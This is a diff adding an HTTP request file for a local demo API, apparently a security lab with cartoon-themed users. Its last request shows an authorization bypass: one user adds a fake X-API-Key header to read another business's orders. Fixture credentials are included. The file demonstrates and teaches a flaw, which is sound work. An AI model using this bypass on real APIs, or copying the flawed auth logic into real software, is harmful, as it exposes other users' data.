@@ -1,0 +1,15 @@
+@base = http://localhost:8000/api/v205
+
+### Legitimate request: Mr. Krabs can list all orders for Krasty Krabs
+GET {{base}}/orders
+X-API-Key: key-mrkrabs-1bd647c2-dc5b-4c2b-a316-5ff83786c219
+
+### Legitimate request: Plankton can list his own orders
+GET {{base}}/orders
+Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
+
+### Vulnerable request: Plankton can list all orders for Krasty Krabs by sending a fake X-API-Key header
+# NOTE: This works ONLY if there are no cookies set in the request
+GET {{base}}/orders
+Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
+X-API-Key: fake
